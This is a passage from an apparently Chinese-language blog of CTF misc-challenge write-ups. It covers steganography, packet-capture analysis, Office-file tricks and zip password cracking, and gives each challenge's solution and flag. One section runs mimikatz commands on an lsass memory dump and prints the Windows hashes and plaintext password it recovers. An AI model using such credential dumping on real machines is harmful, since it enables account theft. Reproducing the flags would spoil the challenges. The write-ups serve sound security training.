class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\r'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 这个我后来又改了一下，这个我感觉是复原二维码来说最好用的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210529000305513.png" alt="得到下面的图像"></p><p>然后用ps添加一下二维码的三个角获得完整的二维码。</p><p>定位角如下</p><p><img src="/2021/05/28/CTF/image-20210528235634252.png" alt="定位角"></p><p>把定位角粘到二维码的三个角的地方就行了，或者使用windows 的画图程序也挺好使的其实，但是如果是拼图的话，画图可能就不是那么好使了。</p><p><img src="/2021/05/28/CTF/image-202105290003055132.png" alt="image-202105290003055132"></p><p>用手机qq勉强也是能扫出来flag的，就是我画的不太好看，用在线的网站都不行。。。<code>flag&#123;QR_c0de_1s_1nterest1n9&#125;</code></p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><h3 id="BugKu、easy-nbt"><a href="#BugKu、easy-nbt" class="headerlink" title="BugKu、easy_nbt"></a>BugKu、easy_nbt</h3><p>这个直接下载个文件的专用打开器，然后把New World文件夹拉入文件打开器search-&gt;value=flag。就找到flag了。</p><p><img src="/2021/05/28/CTF/image-20210530135639553.png" alt="image-20210530135639553"></p><p><code>flag&#123;Do_u_kN0w_nbt?&#125;</code></p><h3 id="buu、-WUSTCTF2020-爬"><a href="#buu、-WUSTCTF2020-爬" class="headerlink" title="buu、[WUSTCTF2020]爬"></a>buu、[WUSTCTF2020]爬</h3><p><strong>TAG:pdf隐写</strong></p><p>使用一般的txt浏览器看一眼是pdf的文件格式，直接把后缀名改为pdf，要修改pdf，这里找了很多pdf的编辑器都是没法使用，要会员什么的，这里用的是福昕pdf编辑器，虽然需要会员才可以保存，但是不需要会员就能编辑。这里我们只需要编辑的功能就可以了。</p><p><img src="/2021/05/28/CTF/image-20210803190718182.png" alt></p><p><img src="/2021/05/28/CTF/image-20210803190759861.png" alt></p><pre class="line-numbers language-none"><code class="language-none">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707dwctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="文件内容隐藏"><a href="#文件内容隐藏" class="headerlink" title="文件内容隐藏"></a>文件内容隐藏</h2><p>这个一般是图片内部加入一些东西，ctf常见题型之一，其类型可能应归属于图片隐写。</p><h3 id="尾部藏文本"><a href="#尾部藏文本" class="headerlink" title="尾部藏文本"></a>尾部藏文本</h3><h4 id="unicode编码-BugKu、这是一张单纯的图片"><a href="#unicode编码-BugKu、这是一张单纯的图片" class="headerlink" title="unicode编码-BugKu、这是一张单纯的图片"></a>unicode编码-BugKu、这是一张单纯的图片</h4><p>是最简单的隐写题类型，直接在文件的尾部发现下面的内容</p><pre class="line-numbers language-none"><code class="language-none">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个内容一看就是unicode啊，再看都小于0xff，那就可以转ASCII码了，直接上拿手python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;'</span>res1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">';&amp;#'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res1<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># key&#123;you are right&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Unicode特征<code>&amp;#&#123;&#125;;</code>，大括号内的内容是数字。</p><h3 id="尾部藏文件"><a href="#尾部藏文件" class="headerlink" title="尾部藏文件"></a>尾部藏文件</h3><h4 id="outguess隐写、alison-likes-jojo"><a href="#outguess隐写、alison-likes-jojo" class="headerlink" title="outguess隐写、alison_likes_jojo"></a>outguess隐写、alison_likes_jojo</h4><p>没啥好说的，压缩包解压之后是两张图片，图片尾部发现zip文件的文件头<code>pk</code>，直接在winhex里面复制粘贴为zip文件后是个真加密的zip，爆破得口令为<code>888866</code>，解压这个压缩包得到内容</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>三次解base64之后得到后面的jpg文件的outguess隐写的key为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">killerqueen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要再对后面的jpg进行outguess，命令为</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">outguess -k &#39;killerqueen&#39; -r &#39;jljy.jpg&#39; flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210601141030631.png" alt="image-20210601141030631"></p><p>得到flag</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">wctf2020&#123;pretty_girl_alison_likes_jojo&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="PNG图片隐写"><a href="#PNG图片隐写" class="headerlink" title="PNG图片隐写"></a>PNG图片隐写</h2><h3 id="修改PNG图片的宽高隐写"><a href="#修改PNG图片的宽高隐写" class="headerlink" title="修改PNG图片的宽高隐写"></a>修改PNG图片的宽高隐写</h3><h4 id="BugKu、隐写"><a href="#BugKu、隐写" class="headerlink" title="BugKu、隐写"></a>BugKu、隐写</h4><p>开局给了一张png图片，拖入winhex改宽高即可。</p><p>先查看文件的详细信息，找到图片的分辨率为<code>500 x 420</code>转成十六进制也就是<code>01F4 x 01A4</code>，在winhex中找到高度宽度位，修改高度位<code>01A4</code>为<code>02A4</code></p><p><img src="/2021/05/28/CTF/image-20210530143746251.png" alt="image-20210530143746251"></p><p><code>BUGKU&#123;a1e5aSA&#125;</code></p><h3 id="PNGのLSB最低位"><a href="#PNGのLSB最低位" class="headerlink" title="PNGのLSB最低位"></a>PNGのLSB最低位</h3><p>一般使用zsteg &amp;&amp; stegsolve &amp;&amp; python脚本解</p><pre class="line-numbers language-none"><code class="language-none"># zsteg使用方法zsteg test.png# 将内容分离到文件zsteg test.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h4><p><strong>TAG:zsteg使用、html、base64</strong></p><p>题目给的附件是两个文件，一个图片，一个有个html的src源代码文件，vscode打开html，发现</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2==="</span> <span class="token delimiter important">?></span></span>suctf&#123;hAHaha_Fak3_F1ag&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就是那个图片了，png考虑lsb，使用zsteg工具，</p><pre class="line-numbers language-none"><code class="language-none">┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.pngimagedata           .. text: &quot;*,+555\n\n\n&quot;b1,r,lsb,xy         .. text: &quot;4QPz1&#123;wS?[P&quot;b1,rgb,lsb,xy       .. file: openssl enc&#39;d data with salted password, base64 encodedb2,r,lsb,xy         .. file: 0420 Alliant virtual executable common library not strippedb3,r,lsb,xy         .. file: StarOffice Gallery theme \375\245N\333PNO\376\3017\026\003\360D\0055%\226Y$\237\3738\020\331\247\226\377-\226\331\177\004\020\233, 50397955 objects, 1st \001b3,b,lsb,xy         .. text: &quot;Yx(7TRIc&quot;b4,r,lsb,xy         .. text: &quot;gwfE#UU #Dwvh&quot;b4,r,msb,xy         .. text: [&quot;\&quot;&quot; repeated 8 times]b4,g,lsb,xy         .. text: &quot;vwvETgfRDw&quot;b4,g,msb,xy         .. text: &quot;!!ffffffff&quot;b4,b,lsb,xy         .. text: &quot;#EDEUEUEEx&quot;b4,b,msb,xy         .. text: &quot;!!ffffffff&quot;b4,rgb,lsb,xy       .. text: &quot;i%p$$sFG&quot;b4,bgr,lsb,xy       .. text: &quot;Yeu$ t&amp;C&quot;┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>出来的<code>1.txt</code>文件的头部发现分组加密的内容</p><p><img src="/2021/05/28/CTF/image-20210606153006340.png" alt></p><pre class="line-numbers language-none"><code class="language-none">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To&#x2F;KeuHg8vKAxFrVQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以前面解得的fake flag作为密钥，解3DES可得flag</p><pre class="line-numbers language-none"><code class="language-none">suctf&#123;U_F0und_1t&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210606153135261.png" alt></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="Telnet流量分析"><a href="#Telnet流量分析" class="headerlink" title="Telnet流量分析"></a>Telnet流量分析</h3><h4 id="Bugku、telnet"><a href="#Bugku、telnet" class="headerlink" title="Bugku、telnet"></a>Bugku、telnet</h4><p>给的流量包拖入wireshark打开跟踪流直接跟踪一段TCP流发现flag</p><p><img src="/2021/05/28/CTF/image-20210530145908225.png" alt="image-20210530145908225"></p><p><code>flag&#123;d316759c281bf925d600be698a4973d5&#125;</code></p><h3 id="http流量分析"><a href="#http流量分析" class="headerlink" title="http流量分析"></a>http流量分析</h3><h4 id="buu、百里挑一"><a href="#buu、百里挑一" class="headerlink" title="buu、百里挑一"></a>buu、百里挑一</h4><p>首先打开wireshark查看一下有什么数据都</p><p><img src="/2021/05/28/CTF/image-20210601230943606.png" alt="image-20210601230943606"></p><p>一看流量包瞬间明白出题人什么意思了，这是让从100多张图片里面选出来包含信息的那个啊，直接导出http对象。。。没啥用</p><p>用<code>exiftool *</code>，发现半拉flag。</p><p><img src="/2021/05/28/CTF/image-20210601232818680.png" alt="image-20210601232818680"></p><p><code>恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</code>，另一半在wireshark里面<code>TCP流 114</code>，这里可以一个一个看，应该没啥简单的方法了。</p><p><img src="/2021/05/28/CTF/image-20210601233334032.png" alt="image-20210601233334032"></p><p><code>26a3c0589d23edeec&#125;</code></p><p><code>flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</code></p><h4 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h4><p>wireshark打开文件，稍微一追踪tcp流就知道这是某嗨客拿工具在扫目录，直接向后跳，到大约<code>819条数据</code>开始出现有用的数据，第824条数据出现关键字<code>flag.txt</code>，还有pk，应该是flag在压缩包里面，压缩包被嗨客下载下来了，导出所有http对象。但是里面并没有发现zip文件，只好使用foremost再分离一下。</p><p><img src="/2021/05/28/CTF/image-20210606114640134.png" alt></p><p>想起刚才导出http对象时有一个lsass文件，最近学域渗透恰巧知道了这个是windows里面存放开机口令的文件，可使用mimikatz来解析。</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得</p><pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 347784 (00000000:00054e88)Session           : Interactive from 1User Name         : AdministratorDomain            : WIN7Logon Server      : WIN7Logon Time        : 2019&#x2F;11&#x2F;14 9:38:33SID               : S-1-5-21-1539156736-1959120456-2224594862-500        msv :         [00000003] Primary         * Username : Administrator         * Domain   : WIN7         * LM       : c4d0515fb12046a475113b7737dc0019         * NTLM     : aafdad330f5a9f4fbf562ed3d25f97de         * SHA1     : 8b9a7ca86970d1392b6fa0b94b8694c2b919469f        tspkg :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        wdigest :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        kerberos :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        ssp :        credman :Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06SID               : S-1-5-19        msv :        tspkg :        wdigest :         * Username : (null)         * Domain   : (null)         * Password : (null)        kerberos :         * Username : (null)         * Domain   : (null)         * Password : (null)        ssp :        credman :Authentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : WIN7$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06SID               : S-1-5-20        msv :        tspkg :        wdigest :         * Username : WIN7$         * Domain   : WORKGROUP         * Password : (null)        kerberos :         * Username : win7$         * Domain   : WORKGROUP         * Password : (null)        ssp :        credman :Authentication Id : 0 ; 48847 (00000000:0000becf)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04SID               :        msv :        tspkg :        wdigest :        kerberos :        ssp :        credman :Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : WIN7$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04SID               : S-1-5-18        msv :        tspkg :        wdigest :         * Username : WIN7$         * Domain   : WORKGROUP         * Password : (null)        kerberos :         * Username : win7$         * Domain   : WORKGROUP         * Password : (null)        ssp :        credman :mimikatz #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解一下压缩包得flag(口令为<code>W3lc0meToD0g3</code>)</p><pre class="line-numbers language-none"><code class="language-none">D0g3&#123;3466b11de8894198af3636c5bd1efce2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h4><p>先导出http的对象，直接save all即可，注意到这是对密码有一个爆破的操作，一个文件一个文件地打开发现flag</p><p><img src="/2021/05/28/CTF/image-20210804183639765.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">SUCTF&#123;password_is_not_weak&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3><p>这个有个大佬写的比较方便的脚本</p><p><strong><a href="https://github.com/WangYihang/UsbKeyboardDataHacker">UsbKeyboardDataHacker</a></strong></p><h4 id="BUUCTF、USB"><a href="#BUUCTF、USB" class="headerlink" title="BUUCTF、USB"></a>BUUCTF、USB</h4><p>题目给出了个rar文件还有个ftm的文件，将ftm文件用binwalk分离出key.pcap流量包，打开之后确实是usb的流量</p><p><img src="/2021/05/28/CTF/image-20210803235852673.png" alt></p><p>那就直接那脚本梭了。</p><p><img src="/2021/05/28/CTF/image-20210804000444335.png" alt></p><p>得到的内容为</p><pre class="line-numbers language-none"><code class="language-none">aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    然后看<code>233.rar</code>这个文件，文件内压缩有一个小文件但是这个文件很大，肯定是格式错误导致第二个文件没有显示出来，用010editor打开提示第三个rar块里面有crc错误，对比其他的块发现错了一个字节，改正即可<code>7A =&gt; 74</code>。</p><p>​    后又得到一个png的文件，stegsolve打开之后在蓝色0通道发现一张二维码</p><p><img src="/2021/05/28/CTF/image-20210804174032957.png" alt=" "></p><pre class="line-numbers language-none"><code class="language-none">ci&#123;v3erf_0tygidv2_fc0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结合上面的key进行维吉尼亚解密</p><p><img src="/2021/05/28/CTF/image-20210804175251645.png" alt></p><pre class="line-numbers language-none"><code class="language-none">fa&#123;i3eei_0llgvgn2_sc0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210804175346375.png" alt></p><pre class="line-numbers language-none"><code class="language-none">&#x3D;&gt;栅栏密码flag&#123;vig3ne2e_is_c00l&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="office文件相关"><a href="#office文件相关" class="headerlink" title="office文件相关"></a>office文件相关</h2><h3 id="word文件内藏文件"><a href="#word文件内藏文件" class="headerlink" title="word文件内藏文件"></a>word文件内藏文件</h3><p>因为office文件的近似于压缩包的格式，使得我们可以将想隐藏的文件藏入解压缩后的各个目录或者文件内，但是一般这样生搬硬套地隐写会导致office文件打开时内容乱码，所以对于office文件，一般来说，有内容乱码的就是文件内藏入了一些文件或者文本。</p><h4 id="bugku、眼见非实"><a href="#bugku、眼见非实" class="headerlink" title="bugku、眼见非实"></a>bugku、眼见非实</h4><p>这个题打开之后出现乱码，直接改后缀名为zip，解压一下找到<code>word-&gt;document.xml</code>文件，打开搜索flag发现flag<code>flag&#123;F1@g&#125;</code></p><h4 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h4><p>打开之后内容很正常，后缀名改为zip解压之后在media文件夹内发现flag的图片</p><p><img src="/2021/05/28/CTF/image23.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">utflag&#123;unz1p_3v3ryth1ng&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="压缩包密码"><a href="#压缩包密码" class="headerlink" title="压缩包密码"></a>压缩包密码</h2><h3 id="buu、-GUET-CTF2019-zips"><a href="#buu、-GUET-CTF2019-zips" class="headerlink" title="buu、[GUET-CTF2019]zips"></a>buu、[GUET-CTF2019]zips</h3><p><strong>TAG:伪加密、掩码爆破</strong></p><p>真加密爆破得第一层得口令为<code>723456</code>，第二层是个简单的伪加密，解出来得<code>flag.zip</code>、<code>setup.sh</code></p><pre class="line-numbers language-none"><code class="language-none">print(__import__(&#39;time&#39;).time())  # setup.sh文件的主要python代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>意思就是取出当前的时间作为<code>flag.zip</code>压缩包的密码，这里先看一下这个密码的格式(执行一下上面的python2代码)</p><pre class="line-numbers language-none"><code class="language-none">1622897453.55<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>太长了，爆破估计是不太可能的，但是注意到这里有上一次的修改日期，有可能进行掩码爆破</p><p><img src="/2021/05/28/CTF/image-20210605204224196.png" alt></p><p>就是对小数点之后的内容进行爆破，将<code>2019-5-17 16:40:15</code>转换为时间戳为<code>1558082415</code>，设置初始的掩码为<code>1558082415.??</code>，如果没找到，就一位一位地向前移动掩码，最后掩码为<code>155808????.??</code>是获得口令为<code>1558080832.15</code>，解压得flag：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;fkjabPqnLawhvuikfhgzyffj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="buu、-MRCTF2020-千层套路"><a href="#buu、-MRCTF2020-千层套路" class="headerlink" title="buu、[MRCTF2020]千层套路"></a>buu、[MRCTF2020]千层套路</h3><p><strong>TAG：zip多层加密、二维码像素、python脚本解</strong></p><p>给的时zip文件，套了很多层，每一层的密码就是这一层的压缩文件的文件名(不带上后缀名的文件名)，一层层解用脚本即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> osname <span class="token operator">=</span> <span class="token string">'0573'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ziip<span class="token punctuation">:</span>        ziip<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        delname <span class="token operator">=</span> name        name <span class="token operator">=</span> ziip<span class="token punctuation">.</span>filelist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>delname <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得出文件<code>qr.zip</code>，解压出txt文件，用脚本再转成图片，200x200的图片</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'qr.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> data<span class="token punctuation">:</span>    a <span class="token operator">=</span> data<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        aa <span class="token operator">=</span> a<span class="token punctuation">[</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'255'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210606142548031.png" alt></p><p>用手机QQ扫一下得flag(QQ我滴超人)</p><pre class="line-numbers language-none"><code class="language-none">MRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="buu、真实的压缩包"><a href="#buu、真实的压缩包" class="headerlink" title="buu、真实的压缩包"></a>buu、真实的压缩包</h3><p>给出两个压缩包，一个名为虚假的压缩包、一个名为真实的压缩包。虚假的压缩包为伪加密，里面是个简单的rsa</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">11</span>q <span class="token operator">=</span> <span class="token number">3</span>n <span class="token operator">=</span> <span class="token number">33</span>phi <span class="token operator">=</span> <span class="token number">20</span>c <span class="token operator">=</span> <span class="token number">26</span>e <span class="token operator">=</span> <span class="token number">3</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"key: 答案是</span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span 